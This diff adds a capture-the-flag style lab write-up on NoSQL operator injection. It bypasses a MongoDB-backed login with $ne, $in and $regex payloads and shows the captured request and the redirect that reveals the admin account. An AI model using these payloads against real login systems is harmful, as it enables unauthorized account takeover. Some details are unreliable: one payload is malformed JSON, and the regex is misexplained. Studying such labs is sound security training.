@@ -1,0 +1,83 @@
+# Exploiting NoSQL operator injection to bypass authentication
+
+## Lab Description :
+![Cap dashboard screenshot](NoSql-level-2-1.png)
+
+## Overview :
+NoSQL databases often use query operators, which provide ways to specify conditions that data must meet to be included in the query result. Examples of MongoDB query operators include:
+
+ . $where - Matches documents that satisfy a JavaScript expression.
+ 
+ . $ne - Matches all values that are not equal to a specified value.
+
+ . $in - Matches all of the values specified in an array.
+
+ . $regex - Selects documents where values match a specified regular expression.
+
+In JSON messages, you can insert query operators as nested objects. For example, {"username":"wiener"} becomes {"username":{"$ne":"invalid"}}.
+
+Consider a vulnerable application that accepts a username and password in the body of a POST request:
+
+``{"username":"wiener","password":"peter"}``
+
+Test each input with a range of operators. For example, to test whether the username input processes the query operator, you could try the following injection:
+
+``{"username":{"$ne":"invalid"},"password":{"peter"}}``
+
+If the $ne operator is applied, this queries all users where the username is not equal to invalid.
+
+If both the username and password inputs process the operator, it may be possible to bypass authentication using the following payload:
+
+``{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}``
+
+This query returns all login credentials where both the username and password are not equal to invalid. As a result, you're logged into the application as the first user in the collection.
+
+To target an account, you can construct a payload that includes a known username, or a username that you've guessed. For example:
+
+``{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}``
+
+## Solution :
+When we try to login a wiener, the following is the request being sent.
+```html
+POST /login HTTP/1.1
+Host: 0a2e004e0498675c8294e27d00550012.web-security-academy.net
+Cookie: session=FidptxGNO2o5A1gT6hVGVo0ahawPmQaa
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: https://0a2e004e0498675c8294e27d00550012.web-security-academy.net/login
+Content-Type: application/json
+Content-Length: 40
+Origin: https://0a2e004e0498675c8294e27d00550012.web-security-academy.net
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Te: trailers
+Connection: close
+
+{"username":"wiener","password":"peter"}
+```
+If we use - ``{"username":{"$in":"admininistrator"},"password":{"$ne":""}}`` , it won't login, since the name of admin user is not administrator but some random string like admin@fra12.
+
+Use the regex operator to login as any user whose name starts with admin.
+
+``{"username":{"$regex":"admin*"},"password":{"$ne":""}}``
+
+The above nosql payload takes any username that starts with admin & checks whether the password is not equal to null value (which will result in TRUE since there will be no password which is null.)
+
+From the response we can see that the name of admin user is - adminsmto9bvx
+```
+HTTP/2 302 Found
+Location: /my-account?id=adminsmto9bvx
+Set-Cookie: session=fGElqIm2RxpmcGKeA1faciz8HjHYRQ8G; Secure; HttpOnly; SameSite=None
+X-Frame-Options: SAMEORIGIN
+Content-Length: 0
+```
+Upon opening the response in browser, we can see that we've logged in as admin & the lab is solved.
+
+![Cap dashboard screenshot](NoSql-level-2-2.png)
+
+![Cap dashboard screenshot](NoSql-level-2-3.png)
+
+#### Visit The Next Page For The Next Level :)
